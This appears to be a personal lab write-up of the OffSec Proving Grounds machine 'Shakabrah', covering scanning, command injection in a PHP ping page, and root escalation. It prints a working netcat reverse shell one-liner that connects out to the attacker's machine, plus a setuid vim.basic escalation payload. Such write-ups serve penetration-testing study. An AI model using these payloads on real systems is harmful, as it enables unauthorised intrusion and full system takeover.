---
title: OffSec PG - Shakabrah
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.80.86`

### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.86`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                                   |
| -------- | ----------- | ------------------------------------------------------------ |
| 22       | SSH         | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.29 ((Ubuntu))                               |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.80.86 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt`

Directories/files listed &rarr;

- index.php

---

## Exploitation

The webpage is basically a php file that executes ping to a given IP address and rendered the result. This is however, vulnerable to command injection. Therefore, IP addresses or domains can be appended with `; whoami` to execute the command and retrieve the result.

This is because user input is directly passed to the backend to execute and retrieve the result. This is the RCE observed. This is used to retrieve the `/etc/passwd` file which has two users of interest &rarr; `dylan` and `root`.

The RCE can also be used to take a look inside the `/home/` directory and the files inside the user `dylan`'s home were readable by `www-data` user RCE, which gives the user flag.

Further, to get a shell, the usual reverse shell one liners are used. None of them worked. Thus followed a convention to look at listening ports using `netstat -ntaup`. These ports are more likely to not be denied connections "to" since they are allowed ports on the machine for connections "from" other addresses.

The shell payload that worked was `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc 192.168.49.172 80 > /tmp/f` with the netcat instance listening on port 80. This gave a shell as `www-data`.

---

## Privilege Escalation

Looking at the setuid binaries in the system, an interesting one is `vim.basic` because vim allows executing shell commands.

Therefore, a shell can be lanuched by using `vim.basic -c ':! bash'` command. However, this does not set the privileges. The uid is still that of `www-data`.

This can be done by using python since it is there on the system, otherwise a C code would have to be compiled and executed. The python command can be executed as follows &rarr;

```
vim.basic -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
```

This gives the root shell and thus the root flag.

---
